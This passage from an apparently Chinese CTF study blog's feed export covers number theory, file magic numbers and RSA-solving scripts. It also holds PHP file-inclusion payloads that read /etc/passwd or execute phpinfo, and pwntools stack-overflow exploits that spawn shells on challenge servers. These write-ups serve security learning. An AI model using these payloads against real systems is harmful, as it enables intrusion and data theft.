为整数 证明： 将 x , y 带入方程得 ax+ab/rt+by-ab/rt=c ax+by=c 此等式恒成立 得证 这里 b/r 与 a/r 为最小的系数，所以求得的解是最多最全面的 证明： 为了推出证明中的 ax+by=c ，且想达到更小的系数，只能将 b/r 与 a/r 同除以一个数 s 而 b/r 与 a/r 互质，且 s 为整数，则 s=1 ，不影响通解 那么 b/r 与 a/r 就为最小的系数 得证 123456789bool linear_equation(int a,int b,int c,int &amp;x,int &amp;y)&#123; int d=exgcd(a,b,x,y); if(c%d) return false; int k=c/d; x*=k; y*=k; //求得的只是其中一组解 return true;&#125;]]></content>
      <categories>
        <category>数论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>算法</tag>
        <tag>数论</tag>
        <tag>欧几里得算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见文件头与文件尾]]></title>
    <url>%2F2019%2F10%2F11%2F%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E4%B8%8E%E6%96%87%E4%BB%B6%E5%B0%BE%2F</url>
    <content type="text"><![CDATA[文件头文件尾总结12345678910111213141516171819202122232425262728293031JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3B ZIP Archive (zip)， 文件头：504B0304 文件尾：50 4Bkdmv 文件头：4B444D56TIFF (tif)， 文件头：49492A00 文件尾：Windows Bitmap (bmp)， 文件头：424D 文件尾：CAD (dwg)， 文件头：41433130 文件尾：Adobe Photoshop (psd)， 文件头：38425053 文件尾：Rich Text Format (rtf)， 文件头：7B5C727466 文件尾：XML (xml)， 文件头：3C3F786D6C 文件尾：HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D546864 png的文件头： （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头 （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13 （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH） （可变）13位数据块（IHDR) 前四个字节代表该图片的宽 后四个字节代表该图片的高 后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。 各类文件的文件头标志1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661、从Ultra－edit-32中提取出来的附件:文件格式分析器JPEG (jpg)，文件头：FFD8FFPNG (png)，文件头：89504E47GIF (gif)，文件头：47494638TIFF (tif)，文件头：49492A00Windows Bitmap (bmp)，文件头：424DCAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Word/Excel (xls.or.doc)，文件头：D0CF11E0MS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Postscript (eps.or.ps)，文件头：252150532D41646F6265Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596ZIP Archive (zip)，文件头：504B0304RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D546864 2、从winhex中取出的文件头列表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305File Type ExtensionsHeaderJPEG jpg;jpeg 0xFFD8FFPNG png 0x89504E470D0A1A0AGIF gif GIF8TIFF tif;tiff 0x49492A00TIFF tif;tiff 0x4D4D002ABit map bmp BMAOL ART art 0x4A47040E000000AOL ART art 0x4A47030E000000PC Paintbrush pcx 0x0A050108Graphics Metafile wmf 0xD7CDC69AGraphics Metafile wmf 0x01000900Graphics Metafile wmf 0x02000900Enhanced Metafile emf 0x0100000058000000Corel Draw cdr CDRCAD dwg 0x41433130Adobe Photoshop psd 8BPSRich Text Format rtf rtfXML xmlHTML html;htm;PHP;php3;php4;phtml;shtml typeEmail eml Delivery-date:Outlook Express dbx 0xCFAD12FEOutlookpst!BDNMS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1MS Access mdb;mda;mde;mdt Standard JWordPerfect wpd 0xFF575043OpenOffice Writer sxw writerOpenOffice Calc sxc calcOpenOffice Math sxm mathOpenOffice Impress sxi impressOpenOffice Draw sxd drawAdobe FrameMaker fm &lt;MAKERFILEPostScript eps.or.ps;ps;eps %!PS-AdobeAdobe Acrobat pdf %PDF-1.Quicken qdf 0xAC9EBD8FQuickBooks Backup qbb 0x458600000600Sage sly.or.srt.or.slt;sly;srt;slt0x53520100Sage Backup 1 SAGEBACKUPLotus WordPro v9 lwp 0x576F726450726FLotus 123 v9 123 0x00001A00051004Lotus 123 v5 wk4 0x00001A0002100400Lotus 123 v3 wk3 0x00001A0000100400Lotus 123 v1 wk1 0x2000604060Windows Password pwl 0xE3828596ZIP Archive zip;jar 0x504B0304ZIP Archive (outdated) zip 0x504B3030RAR Archive rar Rar!GZ Archive gz;tgz 0x1F8B08BZIP Archive bz2 BZhARJ Archive arj 0x60EA7-ZIP Archive 7z 7z集'Wave wav WAVEAVI avi AVIReal Audio ram;ra .ra?0Real Media rm .RMFMPEG mpg;mpeg 0x000001BAMPEG mpg;mpeg 0x000001B3Quicktime mov moovWindows Media asf 0x3026B2758E66CF11MIDI mid MThdWin32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZWin16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZELF Executable elf;; 0x7F454C4601010100各种文件类型文件头标志位详细列表FFD8FFFE00, .JPEG;.JPE;.JPG, "JPGGraphic File"FFD8FFE000, .JPEG;.JPE;.JPG, "JPGGraphic File"474946383961, .gif, "GIF 89A"474946383761, .gif, "GIF 87A"424D, .bmp, "Windows Bitmap"4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;.cpl;.x32, "Executable File"504B0304, .zip, "Zip Compressed"3A42617365, .cnt, ""D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, "MS Compound Document v1 or Lotus Approach APRfile"0100000058000000, .emf, ""03000000C466C456, .evt, ""3F5F0300, .gid;.hlp;.lhp, "Windows HelpFile"1F8B08, .gz, "GZ Compressed File"28546869732066696C65, .hqx, ""0000010000, .ico, "Icon File"4C000000011402, .lnk, "Windows LinkFile"25504446, .pdf, "Adobe PDF File"5245474544495434, .reg, ""7B5C727466,.rtf, "Rich Text Format File"lh, .lzh, "Lz compression file"MThd, .mid, ""0A050108, .pcx, ""25215053, .eps, "Adobe EPS File"2112, .ain, "AIN Archive File"1A02, .arc, "ARC/PKPAK Compressed 1"1A03, .arc, "ARC/PKPAK Compressed 2"1A04, .arc, "ARC/PKPAK Compressed 3"1A08, .arc, "ARC/PKPAK Compressed 4"1A09, .arc, "ARC/PKPAK Compressed 5"60EA, .arj, "ARJ Compressed"41564920, .avi, "Audio Video Interleave(AVI)"425A68, .bz;.bz2, "Bzip Archive"49536328, .cab, "Cabinet File"4C01, .obj, "Compiled Object Module"303730373037, .tar;.cpio, "CPIO ArchiveFile"4352555348, .cru;.crush, "CRUSH ArchiveFile"3ADE68B1, .dcx, "DCX Graphic File"1F8B, .gz;.tar;.tgz, "Gzip ArchiveFile"91334846, .hap, "HAP Archive File"3C68746D6C3E,.htm;.html, "HyperText Markup Language 1"3C48544D4C3E,.htm;.html, "HyperText Markup Language 2"3C21444F4354, .htm;.html, "HyperText MarkupLanguage 3"100, .ico, "ICON File"5F27A889, .jar, "JAR Archive File"2D6C68352D,.lha, "LHA Compressed"20006040600, .wk1;.wks, "Lotus 123 v1 Worksheet"00001A0007800100, .fm3, "Lotus 123 v3 FMTfile"00001A0000100400, .wk3, "Lotus 123 v3Worksheet"20006800200, .fmt, "Lotus 123 v4 FMTfile"00001A0002100400, .wk4, "Lotus 123 v5"5B7665725D, .ami, "Lotus Ami Pro"300000041505052, .adx, "Lotus ApproachADX file"1A0000030000, .nsf;.ntf, "Lotus NotesDatabase/Template"4D47582069747064, .ds4, "MicrografixDesigner 4"4D534346, .cab, "Microsoft CAB FileFormat"4D546864, .mid, "Midi Audio File"000001B3, .mpg;.mpeg, "MPEG Movie"0902060000001000B9045C00, .xls, "MS Excel v2"0904060000001000F6055C00, .xls, "MS Excel v4"7FFE340A,.doc, "MS Word"1234567890FF, .doc, "MS Word 6.0"31BE000000AB0000, .doc, "MS Word forDOS 6.0"1A00000300001100, .nsf, "NotesDatabase"7E424B00, .psp, "PaintShop Pro Image File"504B0304, .zip, "PKZIP Compressed"89504E470D0A, .png, "PNG Image File"6D646174, .mov, "QuickTime Movie"6D646174, .qt, "Quicktime MovieFile"52617221, .rar, "RAR Archive File"2E7261FD, .ra;.ram, "Real AudioFile"EDABEEDB, .rpm, "RPM Archive File"2E736E64, .au, "SoundMachine AudioFile"53495421, .sit, "Stuffit v1 ArchiveFile"53747566664974, .sit, "Stuffit v5Archive File"1F9D, .z, "TAR Compressed ArchiveFile"49492A, .tif;.tiff, "TIFF (Intel)"4D4D2A,.tif;.tiff, "TIFF (Motorola)"554641, .ufa, "UFA Archive File"57415645666D74, .wav, "Wave Files"D7CDC69A,.wmf, "Windows Meta File"4C000000, .lnk, "Windows Shortcut (LinkFile)"504B3030504B0304, .zip, "WINZIPCompressed"FF575047, .wpg, "WordPerfectGraphics"FF575043, .wp, "WordPerfect v5 orv6"3C3F786D6C,.xml, "XML Document"FFFE3C0052004F004F0054005300540055004200, .xml, "XML Document(ROOTSTUB)"3C21454E54495459, .dtd, "XML DTD"5A4F4F20, .zoo, "ZOO Archive File" 转载自：http://www.cnblogs.com/lwy-kitty/p/3928317.htmlhttps://blog.csdn.net/zhembrace/article/details/52717559]]></content>
      <categories>
        <category>安全杂项</category>
      </categories>
      <tags>
        <tag>CTF 安全杂项</tag>
        <tag>文件结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP伪协议]]></title>
    <url>%2F2019%2F10%2F11%2FPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[文件包含漏洞利用的前提1.web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入；2.用户能够控制包含文件的参数，被包含的文件可被当前页面访问；在使用文件包含漏洞时，必须要能知道其绝对路径方法： 在包含文件处，查看其返回的错误的信息 伪协议种类123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 伪协议后文件必须是绝对路径 file条件：allow_url_fopen: off/on allow_url_include: off/on 12Linux ：http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd 绝对路径Windows ：http://192.168.6.128:8001/vulnerabilities/fi/?page=file:///C:\DVWA-master\vulnerabilities\fi\1.txt 绝对路径 php123456php://伪协议，主要为php://input与php://filterphp://input：将POST输入流当做PHP代码执行。其只allow_url_include参数的影响，allow_url_fopen开关与此伪协议无关。php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区php://filter伪协议：不受 allow_url_fopen与allow_url_include参数的影响 123456http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/resource=./1.txt 相对路径http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/resource=file:///C:\DVWA-master\vulnerabilities\fi\1.txt 绝对路径http://127.0.0.1/FI/LFI.php?file=php://filter/resource=file:///etc/passwd此协议主要用于读取php源代码时会用到http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=./1.txt 以base64编码将文件内容输出 zip条件：allow_url_fopen: off/on allow_url_include: off/on 1 、现将要执行 php 代码写好并且命名为 a.txt，将 a.txt 进行 zip 压缩，命名为 a.zip，如果可以上传 zip 文件便直接上传，如若不能可将 a.zip 命名为 a.jpg 上传； 2 、将 a.php 直接压缩成 a.bz2 12http://127.0.0.1/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.zip%23a.txt http://127.0.0.1/FI/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.jpg%23a.txt phar条件：allow_url_fopen: off/on allow_url_include: off/on php 版本大于等于php5.3.0 data1234allow_url_fopen: on allow_url_include: onhttp://192.168.6.128:8001/vulnerabilities/fi/?page=data://test/plain,&lt;?php phpinfo();?&gt;http://192.168.6.128:8001/vulnerabilities/fi/?page=data://test/plain;base64,PD9waHAgcGhwaW5mbygpPz4= input1234条件：allow_url_fopen:off/on allow_url_include：onhttp://127.0.0.1/LFI.php?file=php://input 用post方式提交这个数据 &lt;?php phpinfo()?&gt; http123allow_url_fopen与allow_url_include同时开启。缺一不可http://localhost/test.php?file=http://www.baidu.com 文件包含 百度杯”CTF比赛 2017 二月场include&lt;?php show_source(__FILE__); if(isset($_REQUEST[&apos;path&apos;])){ include($_REQUEST[&apos;path&apos;]); }else{ include(&apos;phpinfo.php&apos;); }发现已经直接包含了phpinfo()。既然是文件包含错误，首先搜索了一下allow_url_include，发现是处于打开的状态。既然 allow_url_include打开，意味着直接能使php://input用包含post中的代码。不多说，直接先查看一下目录下的文件: 发现一个可疑文件dle345aae.php，cat一下参考链接：https://blog.csdn.net/Wu000999/article/details/101925271]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP伪协议</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基本的栈溢出]]></title>
    <url>%2F2019%2F10%2F08%2F%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[程序的内存结构 栈防护技术RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考RELRO技术细节） Stack栈溢出检查，用Canary金丝雀值是否变化来检测,Canary found表示开启。 金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。 NX No Execute，栈不可执行，也就是windows上的DEP。 PIEposition-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。 DEP分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。 DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD） 0x01 where did you born先checksec下，看下防护措施： 没有开启PIE。直接放到IDA里看下： 图中箭头处即是溢出点。分析下 第一次输入overflowme，如果等于1926就会退出，但是想要拿到flag，就需要overflowme的值为1926，那就很明显了，第一次输入的时候随便输个数只要不是1926就行，第二次输入v4 这个数组的时候，利用缓冲区溢出，将overflowme这个变量的值给覆盖成1926就行了，将1926转化为16进制为0x786。通过IDA看下数组和overflow这个变量之间的距离： 0x20-0x18，得到距离是8个字节。只要填充8个字节的垃圾数据，再将其后4个字节的空间覆盖为0x00000786就可以了。此时栈空间如下图： 脚本： 123456789from pwn import*a=remote('111.198.29.45',"50711")a=process('./when_did_you_born')a.recvuntil("What's Your Birth?")a.send('1998')a.recvuntil("What's Your Name?")payload='a'*8+p32(0x00000786)a.senline(payload)a.interactive() 0x02 hello_pwn用IDA查看源码： 可以看到unk_601068跟dword_60106c是连在一起的，所以只需要在read处溢出unk_601068覆盖dword_60106c为0x6E756161即可.exp: 123456from pwn import *p = process('./hello_pwn')p = remote("111.198.29.45","31004")payload = 4*'a' + p32(0x6E756161)p.sendline(payload)p.interactive() 0x03 level0首先用checksec查一下保护。几乎没开什么保护措施。 用ida反汇编。main函数就调用了两个函数。跟进第二个函数 找到溢出点，通过buf缓冲区。又找到函数callsystem()。只要控制程序返回到callsystem地址即可。找到callsystem地址。 脚本： 123456from pwn import*a=remote("111.198.29.45","53539")#a.recvuntil("Hello, World")payload=0x88*'a'+p64(0x400596)a.sendline(payload)a.interactive() 因为是64位程序，所以覆盖rbp和返回地址时都要用64位数据 0x04 level4 放到ida中发现了“/bin/sh”串，和system函数，可以利用== 所以只要在vuln函数返回时跳转到system函数，同时添加参数“/bin/sh”就可以实现exp: 1234567891011121314151617from pwn import *io = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")sys_addr = elf.symbols["system"]bin_addr = elf.search("/bin/sh").next()payload = 'a'*(0x88 + 0x4) #辣鸡填充值payload += p32(sys_addr) #覆盖返回地址到system函数payload += p32(0xdeadbeef) #随意填写system函数调用结束的返回地址payload += p32(bin_addr) #system函数的参数，指向“/bin/sh”，实现调用io.recvline()io.sendline(payload)io.interactive()io.close() 12345678910111213141516171819 p = remote("111.198.29.45","50821")elf = ELF("./level2")sys_addr = elf.symbols["system"] bin_addr = elf.search("/bin/sh").next()payload = 'a'*0x8c payload += p32(sys_addr) payload += p32(0x12345678) payload += p32(bin_addr)'''system=0x08048320binsh=0x0804A024payload='a'*0x8cpayload+=p32(system)payload+=p32(0x12345678)payload+=p32(binsh)p.recvline() p.sendline(payload) p.interactive() 此时程序流程如图 相当于进行了两次溢出。第一次vulnable函数返回地址溢出为system函数地址，第二次system函数返回地址溢出为bin/sh地址 0x05 warmup-csaw 这个程序没有开启任何的保护，而且文件是动态链接却没有给出libc 丢进IDA看一下： 看到了熟悉的gets()函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为v5开辟了40H的存储空间，所以输入长度超过40H即可造成溢出，再看sprint()函数 进入sub_40060D中看一下： 可以看到这个函数是获取flag的关键点，程序会打印出此函数的位置，即0x40060d，到这里思路就差不多明了了，我们需要控制溢出位置，把返回地址改为此函数的地址 exp: 123456from pwn import *a=remote(" "," ")a.recvuntil("&gt;")payload= 'a'*0x40+'a'*8+p64(0x000000000040060D)a.sendline(payload)a.interactive() 0x06 guss num 开启了栈溢出保护和地址随机化，是64位程序 猜随机数的一题，种子是seed[0]，循环10次，10次均对即可跳到sub_C3E函数执行system(“cat flag”)，checksec一波发现开启了canary,不能直接栈溢出到sub_C3E函数 发现var_30在栈中占0x20，可以覆盖到seed如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。只要把seed覆盖为我们已知道的数字，那么生成的随机数也可以算出了。随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。对于该题目，我们将随机种子设置为0或1都可 关于ctype库与dll我们使用python标准库中自带的ctypes模块进行python和c的混合编程 libc共享库可以使用ldd查找 kk@ubuntu:~/Desktop/black/GFSJ/guess_num$ ldd guess_num linux-vdso.so.1 =&gt; (0x00007ffd3f5a0000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e6c0b0000) /lib64/ld-linux-x86-64.so.2 (0x00007f1e6c67d000)也可以在脚本中通过elf文件查找 elf = ELF(&apos;./guess_num&apos;) libc = elf.libc exp如下: 1234567891011121314151617181920from pwn import *from ctypes import *a = remote('111.198.29.45',46063)a = process('./guess_num')elf = ELF('./guess_num')libc = elf.libclibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")payload = "a" * 0x20 + p64(1)a.recvuntil('Please let me know your name!')a.sendline(payload)libc.srand(1)for i in range(10): num = str(libc.rand()%6+1) a.recvuntil('number:') a.sendline(num)a.interactive() 123456789101112131415from pwn import *from ctypes import*context.log_level = 'debug' p = process("./guess_num") libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")pay = "A"*0x20 + p64(1)p.sendlineafter("name:",pay)libc.srand(1)for i in range(10): p.sendlineafter("number:",str(libc.rand()%6 + 1))print p.recv() 0x07 dice game和上题类似。rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。 题目分析：这边就可以看到，buf覆盖0x40位就能覆盖到seed。buf 长度最长为 0x50 但是当输入大于 49 的时候不会被截断，所以我们只要覆盖到之前的 seed 就可以为所欲为了。同时注意到 seed 跟 buf 相差的偏移是 0x40，所以只要 68 个字符就可以溢出覆盖 seed 了。 sub_A20()如下，就是比较你输入的数是否和产生的随机数相等。 当回答正确50次时，会执行sub_B28这个函数，读取flag。 所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。 1234567891011121314151617from pwn import *from ctypes import * context.log_level='debug'libc = cdll.LoadLibrary("libc.so.6")p = process('./dice_game') p = remote("111.198.29.45",58630)p.recvuntil(" let me know your name: ")p.send("A" * 0x40 + p64(1))libc.srand(1)for i in range(50): p.recvuntil("Give me the point(1~6): ") p.send(str(libc.rand()%6 + 1) + "\n") p.interactive() for i in range(50): a.append(libc.rand()%6+1) print(a) for i in a: p.recv() print(p.recv()) p.sendline(str(i)) p.interactive()0x08 cgpwn2拿到题目检查防护： 简单运行下： 放到ida里看下： 函数上面一大串代码都没啥用。主要是这里： 这个name是全局变量。 程序本身调用了system函数，但是没有现成的/bin/sh字符串，可以使用fgets将/bin/sh字符串读入bss区，然后将返回地址覆盖为system函数，参数布置为name的首地址。 bss段具有读写权限，我们可以将”/bin/sh”传到bss段，然后，调用system()函数，从bss段传入字符串我们通过传入name的值位”/bin/sh”,达到将值写入bss段的目的 s的栈空间是0x38,32位的内存是4位，所以，s加上ebp的空间大小是0x4242个 字符 就可以 返回我们gets 的返回地址 然后 我们 只需要 讲system 搞进去 然后输入 bin/sh 就可以了 但是别忘了 输入 system 的返回地址 （这个随便输入就行） 需要输入三个函数的返回地址，第一个是fgets，返回地址是bss_addr,目的是往bss段写入bin/sh,x00是为了补齐八位第二个返回地址是gets,返回地址是system_addr，目的是调用system函数第三个返回地址是system,返回地址随意 1234567891011from pwn import *p = process('./cgpwn2')p = remote("111.198.29.45","44496")system_addr = 0x8048420bss_addr = 0x804A080p.recvuntil('name\n')p.sendline("/bin/sh\x00")p.recvuntil('here:\n')payload = 42*'a' + p32(system_addr) + p32(0) + p32(bss_addr)p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF PWN</tag>
        <tag>二进制漏洞</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA加密算法]]></title>
    <url>%2F2019%2F10%2F08%2FRSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 RSA介绍RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。 0x02 RSA算法RSA的安全基于大数分解的难度。其公钥和私钥是一对大素数（100到200位十进制数或更大）的函数。从一个公钥和密文恢复出明文的难度，等价于分解两个大素数之积（这是公认的数学难题）。 RSA的公钥、私钥的组成，以及加密、解密的公式可见于下表： 算法描述：（1）选择一对不同的、足够大的素数p，q。 （2）计算n=pq。 （3）计算f(n)=(p-1)(q-1)，同时对p, q严加保密，不让任何人知道。 （4）找一个与f(n)互质的数e，且1&lt;e&lt;f(n)。 （5）计算d，使得de≡1 mod f(n)。这个公式也可以表达为d ≡e-1 mod f(n) （6）公钥KU=(e,n)，私钥KR=(d,n)。 （7）加密时，先将明文变换成0至n-1的一个整数M。若明文较长，可先分割成适当的组，然后再进行交换。设密文为C，则加密过程为 （8）解密过程为 0x03 python计算私钥已知p,q,e,求d 1234567import gmpy2p=473398607161q=4511491e=17phi=(p-1)*(q-1)d=long(gmpy2.invert(e,phi))print d 0x04 python解密已知p,q,e,c,求m 123456789101112import gmpy2n=73069886771625642807435783661014062604264768481735145873508846925735521695159e=65537p = 386123125371923651191219869811293586459q = 189239861511125143212536989589123569301assert n==p*qc=15116717704501623028903918131505510580599561357387431295289012193980554012811d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)print (m) 0x05 已知e,d,n求p,q123456789101112131415161718192021222324252627282930313233343536import random def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k /= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n/p return p,q def main(): n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab e = 0x10001 d = 0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881 p,q = getpq(n,e,d) print &quot;p: &quot;+hex(p) print &quot;q: &quot;+hex(q) if __name__ == &apos;__main__&apos;: main() 0x06 公因数分解n12345678910111213def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return an1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743print &quot;p: &quot;+str(gcd(n1,n2))print &quot;q1: &quot;+str(n1/gcd(n1,n2))print &quot;q2: &quot;+str(n2/gcd(n1,n2)) 0x07OpenSSL 使用PEM 文件格式存储证书和密钥。PEM 实质上是Base64 编码的二进制内容，再加上开始和结束行，如证书文件的—–BEGIN CERTIFICATE—–和—–END CERTIFICATE—–在这些标记外面可以有额外的信息，如编码内容的文字表示。 解题思路是：①使用openssl解密.pem中参数–&gt;②参数十六进制转换为十进制–&gt;③利用factor对大整数进行分解，得到p和q –&gt;④用rsatool生成私钥文件: private.pem–&gt;⑤用private.pem解密flag.enc 解析加密密钥openssl rsa -pubin -text -modulus -in pub.key openssl rsa -pubin -text -modulus -inwarmup -in pubkey.pem生成解密密钥rsatool： https://github.com/ius/rsatool python rsatool.py -o private.pem -e 65537 -p XXX-q XXX python rsatool.py -f PEM -o 